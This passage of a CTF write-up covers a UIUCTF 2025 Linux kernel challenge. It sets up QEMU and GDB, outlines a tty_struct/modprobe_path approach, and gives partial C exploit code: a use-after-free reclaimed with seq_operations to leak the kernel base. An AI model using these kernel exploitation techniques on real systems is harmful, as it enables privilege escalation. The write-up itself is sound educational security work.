</span></span><span class="line"><span class="cl">./run.sh</span></span></code></pre></div></div>
<p>Note: I added the <code>-s</code> flag to the QEMU run script. This makes QEMU listen for an incoming GDB connection on TCP port 1234.</p>
<h3 id="gdbscript">gdbscript</h3>
<p>I also created a GDB script to automatically connect and load symbols:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;target remote localhost:1234&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;ks-apply&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">_</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;kmod -q&#34;</span><span class="p">,</span> <span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;add-symbol-file ./vuln.ko </span><span class="si">{</span><span class="n">base</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;set $base=</span><span class="si">{</span><span class="n">base</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">end</span></span></span></code></pre></div></div>
<p>This connects to the QEMU instance on port 1234 and uses <code>ks-apply</code> and <code>kmod</code> to load kernel symbols. I use the <a href="https://github.com/bata24/gef" target="_blank" rel="noopener noreffer ">bata24 fork of GEF</a>, which provides helpful kernel debugging extensions.</p>
<h3 id="usage">usage</h3>
<p>When I run the script like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>./compile.sh exploit.c</code></pre></div>
<p>It compiles the exploit, rebuilds the initramfs, and launches QEMU.</p>
<p>Then, in a new terminal, I run:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>gdb -x gdbscript</code></pre></div>
<p>This automatically connects GDB to the QEMU kernel instance and loads the symbols—ready for debugging.</p>
<h2 id="exploitation">Exploitation</h2>
<p>This challenge can be solved in multiple ways, primarily because we are allowed to allocate memory of <strong>any size</strong>. This opens up several exploitation techniques.</p>
<h3 id="authors-solution">Author&rsquo;s solution</h3>
<p>The author’s solution uses the <code>tty_struct</code> object. This structure contains a pointer named <a href="https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/tty.h#L199" target="_blank" rel="noopener noreffer ">ops</a>, which points to a <code>tty_operations</code> structure. That structure, in turn, includes a pointer for <a href="https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/tty_driver.h#L364" target="_blank" rel="noopener noreffer ">ioctl</a>.</p>
<p>When you call <code>ioctl()</code> on <code>/dev/ptmx</code>, the kernel invokes the <code>tty_ioctl()</code> function. Inside that function, it eventually executes the following <a href="https://elixir.bootlin.com/linux/v6.6.16/source/drivers/tty/tty_io.c#L2779" target="_blank" rel="noopener noreffer ">line</a>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">tty</span><span class="o">-&gt;</span><span class="n">ops</span><span class="o">-&gt;</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">tty</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span></span></span></code></pre></div></div>
<p>This means that if you can overwrite the <code>ioctl</code> pointer inside the <code>tty_operations</code> structure, you gain code execution.</p>
<p>This technique can be used to achieve <strong>arbitrary address write (AAW)</strong>, as explained in this <a href="https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md#aaw-simplified-version-of-rip-control" target="_blank" rel="noopener noreffer ">reference</a>. With this primitive, it&rsquo;s possible to overwrite the <code>modprobe_path</code> variable in the kernel to trigger custom script execution and ultimately leak the flag.</p>
<h3 id="my-solution">My solution</h3>
<h4 id="target-object">Target object</h4>
<p>I used the <a href="https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/seq_file.h#L32" target="_blank" rel="noopener noreffer ">seq_operations</a> object as the target for exploitation.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">seq_operations</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">void</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">start</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">void</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">next</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">show</span><span class="p">)</span> <span class="p">(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></div></div>
<p>This structure contains four function pointers, which are perfect targets for hijacking control flow.</p>
<p>You can trigger the allocation of a <code>seq_operations</code> object by simply opening a <code>/proc</code> stat file:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span></span></span></code></pre></div></div>
<p>This causes the kernel to call <a href="https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L572" target="_blank" rel="noopener noreffer ">single_open</a>, which allocates and initializes a <code>seq_operations</code> structure with function pointers:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">single_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">show</span><span class="p">)(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">		<span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">seq_operations</span> <span class="o">*</span><span class="n">op</span> <span class="o">=</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">op</span><span class="p">),</span> <span class="n">GFP_KERNEL_ACCOUNT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">op</span><span class="o">-&gt;</span><span class="n">start</span> <span class="o">=</span> <span class="n">single_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">op</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">single_next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">op</span><span class="o">-&gt;</span><span class="n">stop</span> <span class="o">=</span> <span class="n">single_stop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">op</span><span class="o">-&gt;</span><span class="n">show</span> <span class="o">=</span> <span class="n">show</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="n">res</span> <span class="o">=</span> <span class="nf">seq_open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">op</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="p">((</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="p">)</span><span class="n">file</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">private</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span>
</span></span><span class="line"><span class="cl">			<span class="nf">kfree</span><span class="p">(</span><span class="n">op</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Once the file is opened, calling <code>read()</code> on the file descriptor will eventually invoke <a href="https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L151" target="_blank" rel="noopener noreffer "><code>seq_read()</code></a>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">seq_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">buf</span><span class="p">,</span> <span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">size</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">kiocb</span> <span class="n">kiocb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">iov_iter</span> <span class="n">iter</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">init_sync_kiocb</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kiocb</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">iov_iter_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">iter</span><span class="p">,</span> <span class="n">ITER_DEST</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">kiocb</span><span class="p">.</span><span class="n">ki_pos</span> <span class="o">=</span> <span class="o">*</span><span class="n">ppos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">seq_read_iter</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kiocb</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iter</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="n">ppos</span> <span class="o">=</span> <span class="n">kiocb</span><span class="p">.</span><span class="n">ki_pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>This function will call <code>seq_read_iter</code>. Inside <code>seq_read_iter</code>, the following <a href="https://elixir.bootlin.com/linux/v6.6.16/source/fs/seq_file.c#L225" target="_blank" rel="noopener noreffer ">line</a> is called:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">op</span><span class="o">-&gt;</span><span class="nf">start</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">index</span><span class="p">);</span></span></span></code></pre></div></div>
<p>This means that if you can overwrite the <code>start</code> function pointer in the <code>seq_operations</code> structure, you gain code execution when <code>read()</code> is called on that file descriptor.</p>
<h4 id="uaf">UAF</h4>
<p>To trigger the Use-After-Free (UAF) on the target object, we first allocate a chunk of memory using the vulnerable driver with the same size as the object we want to target. Then, we free it and immediately allocate the target object (<code>seq_operations</code>) so that it occupies the same memory region.</p>
<p>I created a few helper functions to interact with the driver&rsquo;s <code>ioctl</code> interface:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define ALLOC 0x4008b900
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FREE 0xb901
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_READ 0x8001b902
</span></span></span><span class="line"><span class="cl"><span class="cp">#define USE_WRITE 0x4001b902
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">driver_fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open_dev</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Opening device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to open device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Opened device</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kfree</span><span class="p">()</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">FREE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kread</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">USE_READ</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">kalloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Allocating kernel buffer</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">val</span> <span class="o">=</span> <span class="nf">ioctl</span><span class="p">(</span><span class="n">driver_fd</span><span class="p">,</span> <span class="n">ALLOC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;val = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to allocate memory : 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Now in <code>main()</code>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">driver_fd</span> <span class="o">=</span> <span class="nf">open_dev</span><span class="p">(</span><span class="s">&#34;/dev/vuln&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kalloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Here’s what happens:</p>
<ul>
<li>We first open the device.</li>
<li>Then allocate a 0x20-sized chunk (matching seq_operations).</li>
<li>Free it.</li>
<li>Immediately open /proc/self/stat, which internally allocates a seq_operations object of the same size.</li>
</ul>
<p>If we set a breakpoint at <code>kfree()</code> and inspect the rdi register in GDB, we can see the memory location of the freed object:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/kfree.png"
        data-srcset="/posts/uiuctf_2025/images/kfree.png, /posts/uiuctf_2025/images/kfree.png 1.5x, /posts/uiuctf_2025/images/kfree.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/kfree.png"
        title="img" width="1043" height="670" /></p>
<p>At this point, the memory is zeroed due to <code>kzalloc</code>. But after continuing and re-checking the same address, we now see the seq_operations structure:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/seq.png"
        data-srcset="/posts/uiuctf_2025/images/seq.png, /posts/uiuctf_2025/images/seq.png 1.5x, /posts/uiuctf_2025/images/seq.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/seq.png"
        title="img" width="946" height="119" /></p>
<h4 id="leaks">Leaks</h4>
<p>With UAF in place, we can now leak data from the seq_operations structure using <code>USE_READ</code>. Since this structure contains function pointers, we can use a known offset to calculate the kernel base address.</p>
<p>Using GDB and the <code>xinfo</code> command, we can determine the offset to the base:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/xinfo.png"
        data-srcset="/posts/uiuctf_2025/images/xinfo.png, /posts/uiuctf_2025/images/xinfo.png 1.5x, /posts/uiuctf_2025/images/xinfo.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/xinfo.png"
        title="img" width="1799" height="172" /></p>
<p>Here’s the leak logic in code:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">driver_fd</span> <span class="o">=</span> <span class="nf">open_dev</span><span class="p">(</span><span class="s">&#34;/dev/vuln&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kalloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">kfree</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/proc/self/stat&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">kread</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">start_ptr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">start_ptr</span> <span class="o">-</span> <span class="mh">0x2ba4b0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
